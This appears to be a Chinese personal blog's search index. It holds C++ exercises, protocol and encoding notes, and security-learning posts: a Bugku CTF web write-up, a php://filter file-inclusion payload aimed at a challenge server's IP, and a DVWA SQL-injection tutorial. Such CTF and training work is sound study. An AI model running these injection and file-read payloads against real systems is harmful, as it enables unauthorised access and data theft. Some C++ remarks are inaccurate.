<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>C++ 基本类型大小及范围</title>
    <url>/2020/01/25/C++%20%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E5%A4%A7%E5%B0%8F%E5%8F%8A%E8%8C%83%E5%9B%B4/</url>
    <content><![CDATA[<p><strong>1. 短整型 short：</strong></p>
<pre><code>    所占内存大小：2byte=16bit

    所能表示范围：-32768~32767 (即-2^15~2^15-1)
</code></pre>
<p><strong>2. 整型 int：</strong></p>
<pre><code>&nbsp; &nbsp; 所占内存大小：4byte=32bit

&nbsp; &nbsp; 所能表示范围：-2147483648~2147483647 (即-2^31~2^31-1)

&nbsp; &nbsp;&nbsp;unsigned: &nbsp;

&nbsp; &nbsp; 所占内存大小：4byte=32bit

&nbsp; &nbsp; 所能表示范围：0~4294967295 (即0~2^32-1)
</code></pre>
<span id="more"></span>

<p><strong>3. 长整型 long：</strong></p>
<pre><code>&nbsp; &nbsp; 所占内存大小：4byte=32bit

&nbsp; &nbsp; 所能表示范围：-2147483648~2147483647 (即-2^31~2^31-1)

&nbsp; &nbsp; unsigned long: &nbsp;

&nbsp; &nbsp; 所占内存大小：4byte=32bit

&nbsp; &nbsp; 所能表示范围：0~4294967295 (即0~2^32-1)


        以上short，int，long都默认为有符号型，其中long和int都占4个字节的空间大小。

            16位操作系统：long：4字节，int：2字节

            32位操作系统：long：4字节，int：4字节

            64位操作系统：long：8字节，int：4字节
</code></pre>
<p><strong>4. 字符型 char：</strong></p>
<pre><code>&nbsp; &nbsp; 所占内存大小：1byte=8bit

&nbsp; &nbsp; 所能表示范围：（unsigned和singned中之一）

&nbsp; &nbsp;&nbsp;unsigned char：

&nbsp; &nbsp; 所占内存大小：1byte=8bit

&nbsp; &nbsp; 所能表示范围：0~255；(0~2^8-1)

&nbsp; &nbsp;&nbsp;singned char: &nbsp;

&nbsp; &nbsp; 所占内存大小：1byte=8bit

&nbsp; &nbsp; 所能表示范围：-128~127 (-2^7~2^7-1)
</code></pre>
<p><strong>5. 布尔类型 bool：</strong></p>
<pre><code>&nbsp; &nbsp; 所占内存大小：1byte=8bit

&nbsp; &nbsp;&nbsp;所能表示的范围：false或者true；最小值：0  最大值：1
</code></pre>
<p><strong>6. 单精度 float：</strong></p>
<pre><code>&nbsp; &nbsp; 所占内存大小：4byte=32bit

&nbsp; &nbsp;&nbsp;所能表示的范围：(1.17549e-038)~(3.40282e+038)
</code></pre>
<p><strong>7. 双精度 double：</strong></p>
<pre><code>所占内存大小：8byte=64bit

所能表示的范围：(2.22507e-308)~(1.79769e+308)
</code></pre>
<p><strong>8. 字符串 string：</strong></p>
<pre><code>string在c++中属于类类型，不属于数据类型，类不能计算其在内存中所占大小，如果用sizeof(string)的话，一般结果是 
sizeof(string)=4byte，如果string字符串内容很多，就会溢出，所以就不是其真实大小，string类里面有计算其字节大小的函数如：size() length()
</code></pre>
]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>C++ 矩阵加法</title>
    <url>/2020/02/03/C++%E7%9F%A9%E9%98%B5%E5%8A%A0%E6%B3%95/</url>
    <content><![CDATA[<p><strong>问题描述</strong><br>　　给定两个 N×M 的矩阵，计算其和。其中：N 和 M 大于等于 1 且小于等于 100，矩阵元素的绝对值不超过 1000。</p>
<p><strong>输入格式</strong><br>　　输入数据的第一行包含两个整数 N、M，表示需要相加的两个矩阵的行数和列数。<br>　　接下来 2*N 行每行包含 M 个数，其中前 N 行表示第一个矩阵，后 N 行表示第二个矩阵。</p>
<p><strong>输出格式</strong><br>　　你的程序需要输出一个 N*M 的矩阵，表示两个矩阵相加的结果。<br>　　注意，输出中每行的最后不应有多余的空格，否则你的程序有可能被系统认为是 Presentation Error</p>
<p><strong>样例输入</strong><br>2 2<br>1 2<br>3 4<br>5 6<br>7 8</p>
<p><strong>样例输出</strong><br>6 8<br>10 12</p>
<p><strong>问题分析</strong><br>　　1. 需要懂得基本矩阵加法。<br>　　行和列相同矩阵才可以相加，对应位置的元素相加。<br>　　2. 需要懂得基本循环和多维数组；<br>　　例如：A [2][3]，和数学上矩阵类似。</p>
<span id="more"></span>
<p><strong>参考代码</strong><br><strong>C++</strong></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    //定义多维数组；</span><br><span class="line"></span><br><span class="line">    int n,m;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    int A[n][m];</span><br><span class="line">    int B[n][m];</span><br><span class="line"></span><br><span class="line">    //输入数据</span><br><span class="line">    for(int i=0; i&lt;n; i++)</span><br><span class="line">        for(int j=0; j&lt;m; j++)</span><br><span class="line">        cin&gt;&gt;A[i][j];</span><br><span class="line">    for(int i=0; i&lt;n; i++)</span><br><span class="line">        for(int j=0; j&lt;m; j++)</span><br><span class="line">        cin&gt;&gt;B[i][j];</span><br><span class="line">    //对应位置相加并且存在B数组里</span><br><span class="line">    for(int i=0; i&lt;n; i++)</span><br><span class="line">        for(int j=0; j&lt;m; j++)</span><br><span class="line">            B[i][j]=A[i][j]+B[i][j];</span><br><span class="line">    //输出数组</span><br><span class="line">    for(int i=0; i&lt;n; i++)</span><br><span class="line">        for(int j=0; j&lt;m; j++)</span><br><span class="line">        {</span><br><span class="line">            cout&lt;&lt;B[i][j];</span><br><span class="line">            if(j&lt;m-1)        </span><br><span class="line">                cout&lt;&lt;" ";      //某行某列最后一个元素后不加空格</span><br><span class="line">            if(j==m-1)</span><br><span class="line">                cout&lt;&lt;endl;     //某行某列最后一个数后换行</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>数组查找及替换</title>
    <url>/2020/01/29/C++%E6%95%B0%E7%BB%84%E6%9F%A5%E6%89%BE%E5%8F%8A%E6%9B%BF%E6%8D%A2/</url>
    <content><![CDATA[<p><strong>问题描述</strong></p>
<p>　　给定某整数数组和某一整数 b。要求删除数组中可以被 b 整除的所有元素，同时将该数组各元素按从小到大排序。如果数组元素数值在 A 到 Z 的 ASCII 之间，替换为对应字母。元素个数不超过 100，b 在 1 至 100 之间。</p>
<p><strong>输入格式</strong></p>
<p>　　第一行为数组元素个数和整数 b<br>　　第二行为数组各个元素</p>
<p><strong>输出格式</strong></p>
<p>　　按照要求输出</p>
<p><strong>样例输入</strong></p>
<p>7 2<br>77 11 66 22 44 33 55</p>
<p><strong>样例输出</strong></p>
<p>11 33 55 M</p>
<span id="more"></span>
<p><strong>问题分析</strong></p>
<p>　　1. 需要懂得排序</p>
<p>　　　　这里我用冒泡排序，当然使用头文件 “#include<algorithm>” 中已有的排序函数 “Collection.sort ()” 也行。</algorithm></p>
<p>　　2. 需要懂得输出对应 ASCII 码值对应的字符</p>
<p>　　　　使用 cout&lt;&lt;(char) A [i] 将数值转换为对应的字符。（A [i] 为你设定的数组）</p>
<p><strong>参考代码</strong></p>
<p><strong>C++</strong></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">{</span><br><span class="line">    //输入数据</span><br><span class="line">    int n,b;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;b;</span><br><span class="line">    int A[n];</span><br><span class="line">    for(int i=0; i&lt;n; i++)</span><br><span class="line">        cin&gt;&gt;A[i];</span><br><span class="line"></span><br><span class="line">    //冒泡排序</span><br><span class="line">    int temp=0;</span><br><span class="line">    for(int i=0; i&lt;n-1; i++)</span><br><span class="line">    {</span><br><span class="line">        for(int j=0; j&lt;n-1-i; j++)</span><br><span class="line">            if(A[j]&gt;A[j+1])</span><br><span class="line">            {</span><br><span class="line">                temp=A[j];</span><br><span class="line">                A[j]=A[j+1];</span><br><span class="line">                A[j+1]=temp;</span><br><span class="line">            }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //删除能被b整除的数</span><br><span class="line">    for(int i=0; i&lt;n; i++)</span><br><span class="line">    {</span><br><span class="line">        if(A[i]%b==0)</span><br><span class="line">        {</span><br><span class="line">            for(int j=i; j&lt;n; j++)</span><br><span class="line">                A[j]=A[j+1];</span><br><span class="line">                n-=1;//删除一个总数据 n 减一个</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    //输出数据</span><br><span class="line">    for(int i=0; i&lt;n; i++)</span><br><span class="line">    {</span><br><span class="line">        if(A[i]&gt;='A' &amp;&amp; A[i]&lt;='Z')   //在‘A’到‘Z’对应的ASCII码值之间时转换成字母</span><br><span class="line">            cout&lt;&lt;char(A[i])&lt;&lt;" ";</span><br><span class="line">        else</span><br><span class="line">            cout&lt;&lt;A[i]&lt;&lt;" ";</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
      <categories>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>TCP-IP协议</title>
    <url>/2020/07/08/TCP-IP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p>注：本文主要用于学习记录，方便查阅，如有侵权，请联系删除，来自W3school。</p>
<p><strong>TCP - 传输控制协议</strong><br>TCP 用于从应用程序到网络的数据传输控制。<br>TCP 负责在数据传送之前将它们分割为 IP 包，然后在它们到达的时候将它们重组。</p>
<a id="more"></a>
<hr>
<p><strong>IP - 网际协议</strong><br>IP 负责计算机之间的通信。<br>IP 负责在因特网上发送和接收数据包。</p>
<hr>
<p><strong>HTTP - 超文本传输协议</strong><br>HTTP 负责 web 服务器与 web 浏览器之间的通信。<br>HTTP 用于从 web 客户端（浏览器）向 web 服务器发送请求，并从 web 服务器向 web 客户端返回内容（网页）。</p>
<hr>
<p><strong>HTTPS - 安全的 HTTP</strong><br>HTTPS 负责在 web 服务器和 web 浏览器之间的安全通信。<br>作为有代表性的应用，HTTPS 会用于处理信用卡交易和其他的敏感数据。</p>
<hr>
<p><strong>SSL - 安全套接字层</strong><br>SSL 协议用于为安全数据传输加密数据。</p>
<hr>
<p><strong>SMTP - 简易邮件传输协议</strong><br>SMTP 用于电子邮件的传输。</p>
<hr>
<p><strong>MIME - 多用途因特网邮件扩展</strong><br>MIME 协议使 SMTP 有能力通过 TCP/IP 网络传输多媒体文件，包括声音、视频和二进制数据。</p>
<hr>
<p><strong>IMAP - 因特网消息访问协议</strong><br>IMAP 用于存储和取回电子邮件。</p>
<hr>
<p><strong>POP - 邮局协议</strong><br>POP 用于从电子邮件服务器向个人电脑下载电子邮件。</p>
<hr>
<p><strong>FTP - 文件传输协议</strong><br>FTP 负责计算机之间的文件传输。</p>
<hr>
<p><strong>NTP - 网络时间协议</strong><br>NTP 用于在计算机之间同步时间（钟）。</p>
<hr>
<p><strong>DHCP - 动态主机配置协议</strong><br>DHCP 用于向网络中的计算机分配动态 IP 地址。</p>
<hr>
<p><strong>SNMP - 简单网络管理协议</strong><br>SNMP 用于计算机网络的管理。</p>
<hr>
<p><strong>LDAP - 轻量级的目录访问协议</strong><br>LDAP 用于从因特网搜集关于用户和电子邮件地址的信息。</p>
<hr>
<p><strong>ICMP - 因特网消息控制协议</strong><br>ICMP 负责网络中的错误处理。</p>
<hr>
<p><strong>ARP - Address Resolution Protocol</strong><br>ARP - 用于通过 IP 来查找基于 IP 地址的计算机网卡的硬件地址。</p>
<hr>
<p><strong>RARP - Reverse Address Resolution Protocol</strong><br>RARP 用于通过 IP 查找基于硬件地址的计算机网卡的 IP 地址。</p>
<hr>
<p><strong>BOOTP - Boot Protocol</strong><br>BOOTP 用于从网络启动计算机。</p>
<hr>
<p><strong>PPTP - 点对点隧道协议</strong><br>PPTP 用于私人网络之间的连接（隧道）。</p>
]]></content>
  </entry>
  <entry>
    <title>编码大全</title>
    <url>/2020/07/08/%E7%BC%96%E7%A0%81%E5%A4%A7%E5%85%A8/</url>
    <content><![CDATA[<p>持续更新中… 2020.07.20</p>
<ol>
<li><p>摩斯密码：..-./.-../.-/–.</p>
</li>
<li><p>栅栏密码：把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话，例如：KYsd3js2E{a2jda}</p>
</li>
<li><p>W型栅栏密码：以密文排列成一个W型然后从左到右，从上到下取出字符组成新的字符串即为明文</p>
</li>
<li><p>ook！：Ook.Ook.Ook.Ook.Ook.Ook.Ook！Ook！Ook！</p>
</li>
<li><p>brainfuck：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++</p>
<a id="more"></a></li>
<li><p>ASCII码凯撒密码：由英文位移得到新的英文作为密文，例如：ABCD-&gt;CDEF,位移2位</p>
</li>
<li><p>base16: 特征特点：密文由16个字符（0-9,A-F）组成 </p>
</li>
<li><p>base32: 特征特点：密文由32个字符（A-Z,2-7)组成，末尾可能会有‘=’，但最多有6个 </p>
</li>
<li><p>base36: 特征特点：密文由36个字符（0-9,a-z）组成，加密仅支持整数数字，解密仅支持字符串，不支持中文 密文由36个字符（0-9,A-Z）</p>
</li>
<li><p>base58编码: 特征特点： Base58是用于Bitcoin中使用的一种独特的编码方式，主要用于产生Bitcoin的钱包地址，Base58不使用数字”0”，字母大写”O”，字母大写”I”，和字母小写”l”，以及”+”和”/”符号 </p>
</li>
<li><p>base62编码: 特征特点：密文由62字符（0-9，a-z，A-Z）组成 </p>
</li>
<li><p>base64: 特征特点：密文由64个字符(A-Z,a-z,0-9,+,/)组成，末尾可能会出现1或2个’=’ 最多有2个 加密原理过程如下：</p>
</li>
<li><p>base91编码: 特征特点：密文由91个字符（0-9，a-z，A-Z,!#$%&amp;()*+,./:;&lt;=&gt;?@[]^_`{|}~”）组成 </p>
</li>
<li><p>字母表编码：特征特点：用数字1-26或者0-25来编码范围为A-Z/a-z字母字符，字母不区分大小写。</p>
</li>
<li><p>进制编码：特征特点：主要是各进制之间的转换 二进制数，只有01两个字符 八进制数，0开头，用[0-7] 8个字符表示 十六进制数，0x开头，[0-9，a-f ]等十六个个字符表示</p>
</li>
<li><p>ASCII编码：特征特点：用1个字节的8位数来编码英文字符集，即所有字母数字等英文符号可以用二进制数、十进制、十六进制来表示。比如大写字母A可分别用二进制数（01000001）、十进制（65）、十六进制（0x41）来表示。</p>
</li>
<li><p>GBK/GBK2312编码：特征特点：用2个字节16比特的16进制数表示来编码中文字符集，其中GBK是GBK2312的扩展字符集编码，包含简体、繁体中文、日语、韩语等。比如斗哥斗对应的GBK和GBK2312为B6B7。</p>
</li>
<li><p>unicode编码：特征特点：国际标准字符，将全球的各种语言的每个字符定义一个唯一的编码，以满足跨语言、跨平台文本信息的转换，当编码和解码的字符集出现不一致的时候就会出现乱码。 unicode一般有四种表示形式 &amp;#x [Hex]: &#x0054;&#x0068;&#x0065; &amp;# [Decimal]: &#00084;&#00104;&#00101; \U [Hex]: \U0054\U0068\U0065 \U+ [Hex]: \U+0054\U+0068\U+0065</p>
</li>
<li><p>UTF-8：特征特点：utf-8是一种可变长的字符编码，主要是为了节省存储空间，编码长度根据编码的字符集从1个字节到6个字节不等。</p>
</li>
<li><p>URL编码：特征特点：一个字符ascii码的十六进制，然后在前面加上% </p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title>bugku-web</title>
    <url>/2020/07/08/bugku-web/</url>
    <content><![CDATA[<p>持续更新中… 2020.07.24<br>展开全文有图片<br>1.web2 2020-7-9</p>
<hr>
<p><img src="./web2.png"><br>查看源码之后一眼就能看到<br>flag：KEY{Web-2-bugKssNNikls9100}</p>
<span id="more"></span>


<h2 id="2-计算器-2020-7-9"><a href="#2-计算器-2020-7-9" class="headerlink" title="2.计算器 2020-7-9"></a>2. 计算器 2020-7-9</h2><p><img src="./%E8%AE%A1%E7%AE%97%E5%99%A8-1.png"><br>查看源码，图中所指限制了输入数字的个数，改成比计算结果大的数字就可以获得 flag</p>
<p><img src="./%E8%AE%A1%E7%AE%97%E5%99%A8-2.png"><br>flag：flag{CTF-bugku-0032}</p>
<h2 id="3-web基础-GET-2020-7-9"><a href="#3-web基础-GET-2020-7-9" class="headerlink" title="3.web基础$_GET 2020-7-9"></a>3.web 基础 $_GET 2020-7-9</h2><p><img src="./web%E5%9F%BA%E7%A1%80$_GET.png"><br>因为 $_GET 传参时请求的参数是在 url 中的，专业术语就是，查询字符串（名称 / 值对）是在 GET 请求的 URL 中发送的，因此修改网址在其后面加上？what=flag，回车得到 flag。<br>详情请阅读 w3school 的 html 表单部分<br>flag：flag{bugku_get_su8kej2en}</p>
<h2 id="4-web基础-POST-2020-7-11"><a href="#4-web基础-POST-2020-7-11" class="headerlink" title="4.web基础$_POST 2020-7-11"></a>4.web 基础 $_POST 2020-7-11</h2><p><img src="./web%E5%9F%BA%E7%A1%80$_POST.png"><br>POST 传值不同于 GET 传值，POST 传值数据不会显示在 URL 中，也就是网址中，查询字符串（名称 / 值对）是在 POST 请求的 HTTP 消息主体中发送的，相对于 GET 传值是比较安全的，所以这里需要用到 hackbar 辅助传值，也就是下方的工具栏，在工具栏上方输入 url，下方输入表达式，点击 Execute 按钮执行，值就会被传到服务器，服务器做出响应输出服务器中的参数，也就是这里的 flag<br>flag：flag{bugku_get_ssseint67se}</p>
<h2 id="5-矛盾-2020-7-11"><a href="#5-矛盾-2020-7-11" class="headerlink" title="5.矛盾 2020-7-11"></a>5. 矛盾 2020-7-11</h2><p><img src="./%E7%9F%9B%E7%9B%BE.png"><br>实际上是弱类型比较，第一个 if 判断中的 is_numeric 判断其中的参数是否是纯数字，如果是返回 true，否则返回 false，第二个 if 是弱类型判断，这里的函数具体是，当其中的参数等于 1 时会输出 flag。<br>当两个不同类型的参数进行 ‘==’ 比较而非 ‘===’ 比较时，将会转换成相同类型进行比较。</p>
<ol>
<li>var_dump(“admin”==0);  //true</li>
<li>var_dump(“1admin”==1); //true</li>
<li>var_dump(“admin1”==1) //false</li>
<li>var_dump(“admin1”==0) //true</li>
<li>var_dump(“0e123456”==”0e4456789”); //true<br>由第 1 个和第 2 个可知，当第一个字符为数字，后面都是字符串或字符时，字符串或字符将会等同于 0，整体等于第 1 个数字加上 0，又因为题目具体要求为与 1 比较，所以这时候的 GET 参数构造就应该为 1xxxxx，xxxxx 为任意字母。<br>flag：flag{bugku-789-ps-ssdf}</li>
</ol>
<h2 id="6-web3-2020-7-11"><a href="#6-web3-2020-7-11" class="headerlink" title="6.web3 2020-7-11"></a>6.web3 2020-7-11</h2><p><img src="./web3-1.png"><br>查看源代码发现编码，结合 unicode 编码特点，确定为 unicode 编码<br>unicode 一般有四种表示形式<br>1 &amp;#x [Hex]: &amp;#x0054;&amp;#x0068;&amp;#x0065;<br>2 &amp;# [Decimal]: &amp;#00084;&amp;#00104;&amp;#00101;<br>3 \U [Hex]: \U0054\U0068\U0065<br>4 \U+ [Hex]: \U+0054\U+0068\U+0065<br><img src="./web3-2.png"><br>flag：KEY{J2sa42ahJK-HS11III}</p>
<h2 id="7-域名解析-2020-7-17"><a href="#7-域名解析-2020-7-17" class="headerlink" title="7.域名解析 2020-7-17"></a>7. 域名解析 2020-7-17</h2><p><img src="./%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90.png"><br>先了解 hosts 文件，Hosts 是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的 IP 地址建立一个关联 “数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从 Hosts 文件中寻找对应的 IP 地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统再会将网址提交 DNS 域名解析服务器进行 IP 地址的解析。简单来说就是关联域名和 url，也可以说是等于。<br>flag：KEY{DSAHDSJ82HDS2211}</p>
<h2 id="8-你必须让他停下-2020-7-17"><a href="#8-你必须让他停下-2020-7-17" class="headerlink" title="8.你必须让他停下 2020-7-17"></a>8. 你必须让他停下 2020-7-17</h2><p><img src="./%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B-1.png"><br><img src="./%E4%BD%A0%E5%BF%85%E9%A1%BB%E8%AE%A9%E4%BB%96%E5%81%9C%E4%B8%8B-2.png"><br>burpsuit 抓包让他停下，有很多图片，应该是在第 10 张 jpg 里面，服务器响应代码里面有 flag<br>flag：flag{dummy_game_1s_s0_popular}</p>
<h2 id="9-变量1-2020-7-17"><a href="#9-变量1-2020-7-17" class="headerlink" title="9.变量1 2020-7-17"></a>9. 变量 1 2020-7-17</h2><p><img src="./%E5%8F%98%E9%87%8F1.png"><br>代码解释，先引用外部文件 flag1.php，flag 字符串包含在这个文件里面，isset () 函数用于检测变量是否已设置并且非 NULL，简单来说就是解释变量有没有赋值，有就 true，没有 false，进入 if，GET 赋值给 args，第二份 if 判断有没有这些字符串，有就输出 “args error！” 然后退出，没有就继续下一行代码，var_dump 函数就是输出变量的信息，其实就是输出变量里的东西，但是会多出来其他东西，而 $$ 会导致两次变量转换，而恰好我们在 url 里输入的 GLOBALS 为全局变量，会输出这个程序里的所有全局变量，而外部文件引用要使用全局变量才能给别的文件使用，$args 是字符串 GLOBALS, $$args 就是 $GLOBALS，所以输出所有全局变量，其中就有包含 flag 字符串的全局变量。（其实你要是知道包含 flag 的全局变量也可以赋值给 args，但是很显然不知道，所有用 GLOBALS）<br>flag：flag{92853051ab894a64f7865cf3c2128b34}</p>
<h2 id="10-web5-2020-7-17"><a href="#10-web5-2020-7-17" class="headerlink" title="10.web5 2020-7-17"></a>10.web5 2020-7-17</h2><p><img src="./web5-1.png"><br><img src="./web5-2.png"><br>查看源码，这是 js 的一种编码，直接输入控制台就能解码了，网页控制台就是简单的 js 简单代码交流的，类似 python 的一条一条代码交流的那个。还有类似的那个 emoji 编码也可以这样弄。<br>flag：ctf{whatfk}</p>
<h2 id="11-头等舱-2020-7-17"><a href="#11-头等舱-2020-7-17" class="headerlink" title="11.头等舱 2020-7-17"></a>11. 头等舱 2020-7-17</h2><p><img src="./%E5%A4%B4%E7%AD%89%E8%88%B1.png"><br>源码啥都没有，抓包藏在表单里<br>flag：flag{Bugku_k8_23s_istra}</p>
<h2 id="12-管理员系统-2020-7-17"><a href="#12-管理员系统-2020-7-17" class="headerlink" title="12.管理员系统 2020-7-17"></a>12. 管理员系统 2020-7-17</h2><p><img src="./%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F-1.png"><br><img src="./%E7%AE%A1%E7%90%86%E5%91%98%E7%B3%BB%E7%BB%9F-2.png"><br>简单的 bp 爆破，具体爆破方法直接百度<br>flag：flag{85ff2ee4171396724bae20c0bd851f6b}</p>
<h2 id="13-web4-2020-7-17"><a href="#13-web4-2020-7-17" class="headerlink" title="13.web4 2020-7-17"></a>13.web4 2020-7-17</h2><p><img src="./web4-1.png"><br>源码里有 url 编码，组合起来 url 解码<br><img src="./web4-2.png"><br>然后把 67d709b2b54aa2aa648cf6e87a7114f1 提交到浏览器中<br><img src="./web4-3.png"></p>
]]></content>
      <categories>
        <category>WriteUp</category>
      </categories>
      <tags>
        <tag>WriteUp-bugku</tag>
      </tags>
  </entry>
  <entry>
    <title>php filter 的应用</title>
    <url>/2020/07/17/php%20filter%E7%9A%84%E5%BA%94%E7%94%A8/</url>
    <content><![CDATA[<h1 id="本地文件包含漏洞和php伪协议"><a href="#本地文件包含漏洞和php伪协议" class="headerlink" title="本地文件包含漏洞和php伪协议"></a>本地文件包含漏洞和 php 伪协议</h1><h2 id="php-x2F-x2F-filter的应用："><a href="#php-x2F-x2F-filter的应用：" class="headerlink" title="php://filter的应用："></a>php://filter 的应用：</h2><p>1、利用 base64 获得源码<br>2、通过读写编码实现绕过</p>
<h2 id="php-x2F-x2F-filter是什么？"><a href="#php-x2F-x2F-filter是什么？" class="headerlink" title="php://filter是什么？"></a>php://filter 是什么？</h2><p>php://filter 是什么：<br>php 中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取。</p>
<span id="more"></span>
<p>参数：<br>resource=&lt;要过滤的数据流&gt;&amp;nbsp;        指定了你要筛选过滤的数据流。                      必选<br>read=&lt;读链的筛选列表&gt;&amp;nbsp;            可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选<br>write=&lt;写链的筛选列表&gt;&amp;nbsp;           可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选<br>&lt;; 两个链的筛选列表&gt;&amp;nbsp;              任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</p>
<h2 id="实例：bugku：“flag在index里”"><a href="#实例：bugku：“flag在index里”" class="headerlink" title="实例：bugku：“flag在index里”"></a>实例：bugku：“flag 在 index 里”</h2><p><img src="./php%20filter%E7%9A%84%E5%BA%94%E7%94%A8-1.png"><br>url 地址  <a href="http://120.24.86.145:8005/post/index.php?file=show.php">http://120.24.86.145:8005/post/index.php?file=show.php</a><br>典型的文件包含漏洞，用到了 php 的封装协议</p>
<p>payload：<br><code>http://120.24.86.145:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</code></p>
<p><img src="./php%20filter%E7%9A%84%E5%BA%94%E7%94%A8-2.png"></p>
<p>文件内容就会以 base64 编码的形式显示出来，解码就可以获得 flag<br>解码后的内容：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-ctf&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">	error_reporting(0);</span><br><span class="line">	if(!$_GET[file]){echo '&lt;a href="./index.php?file=show.php"&gt;click me? no&lt;/a&gt;';}</span><br><span class="line">	$file=$_GET['file'];</span><br><span class="line">	if(strstr($file,"../")||stristr($file, "tp")||stristr($file,"input")||stristr($file,"data")){</span><br><span class="line">		echo "Oh no!";</span><br><span class="line">		exit();</span><br><span class="line">	}</span><br><span class="line">	include($file); </span><br><span class="line">//flag:flag{edulcni_elif_lacol_si_siht}</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>file=php://filter/read=convert.base64-encode/resource=index.php 的含义:<br><code>这是一个file关键字的get参数传递，php://是一种协议名称，php://filter/是一种访问本地文件的协议，/read=convert.base64-encode/表示读取的方式是 base64编码后，resource=index.php表示目标文件为index.php。</code></p>
<p>通过传递这个参数可以得到 index.php 的源码，下面说说为什么，看到源码中的 include 函数，这个表示从外部引入 php 文件并执行，如果执行不成功，就返回文件的源码。</p>
<p>而 include 的内容是由用户控制的，所以通过我们传递的 file 参数，是 <code>include()</code> 函数引入了 index.php 的 base64 编码格式，因为是 base64 编码格式，所以执行不成功，返回源码，所以我们得到了源码的 base64 格式，解码即可。</p>
<p>如果不进行 base64 编码传入，就会直接执行，而 flag 的信息在注释中，是得不到的</p>
<p>部分内容来自：<a href="https://blog.csdn.net/zpy1998zpy/article/details/80585443">https://blog.csdn.net/zpy1998zpy/article/details/80585443</a></p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
      <tags>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Sql 注入漏洞详解</title>
    <url>/2020/07/30/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="一、Sql-注入漏洞详解"><a href="#一、Sql-注入漏洞详解" class="headerlink" title="一、Sql 注入漏洞详解"></a>一、Sql 注入漏洞详解</h1><h2 id="1-1-Sql-注入产生原因及威胁："><a href="#1-1-Sql-注入产生原因及威胁：" class="headerlink" title="1.1 Sql 注入产生原因及威胁："></a>1.1 Sql 注入产生原因及威胁：</h2><p>当我们访问动态网页时，Web 服务器会向数据访问层发起 Sql 查询请求，如果权限验证通过就会执行 Sql 语句。<br>这种网站内部直接发送的 Sql 请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造 Sql 语句，如果用户输入的数据被构造成恶意 Sql 代码，Web 应用又未对动态构造的 Sql 语句使用的参数进行审查，则会带来意想不到的危险。</p>
<p>Sql 注入带来的威胁主要有如下几点：</p>
<p>・猜解后台数据库，这是利用最多的方式，盗取网站的敏感信息。<br>・绕过认证，列如绕过验证登录网站后台。<br>・注入可以借助数据库的存储过程进行提权等操作</p>
<span id="more"></span>
<h2 id="1-2-Sql-注入示例一-猜解数据库"><a href="#1-2-Sql-注入示例一-猜解数据库" class="headerlink" title="1.2 Sql 注入示例一.猜解数据库"></a>1.2 Sql 注入示例一。猜解数据库</h2><p>接下来我们通过一个实例，让你更加清楚的理解 Sql 注入猜解数据库是如何发生的。<br>使用 DVWA 渗透测试平台，作为攻击测试的目标：<br><img src="./sql%E6%B3%A8%E5%85%A5-1.jpg"><br>先输入 1 ，查看回显 (URL 中 ID=1，说明 php 页面通过 get 方法传递参数)：<br><img src="./sql%E6%B3%A8%E5%85%A5-2.jpg"><br>那实际上后台执行了什么样的 Sql 语句呢？点击 <code>view source</code> 查看源代码 ，其中的 SQL 查询代码为：<br><img src="./sql%E6%B3%A8%E5%85%A5-3.jpg"><br>可以看到，实际执行的 Sql 语句是：<br><code>SELECT first_name, last_name FROM users WHERE user_id = '1';</code><br>我们是通过控制参数 Id 的值来返回我们需要的信息。<br>如果我们不按常理出牌，比如在输入框中输入 <code>1' order by 1#</code><br>实际执行的 Sql 语句就会变成:<br><code>SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1#`;(按照Mysql语法，#后面会被注释掉，使用这种方法屏蔽掉后面的单引号，避免语法错误)</code><br>这条语句的意思是查询 users 表中 user_id 为 1 的数据并按第一字段排行。</p>
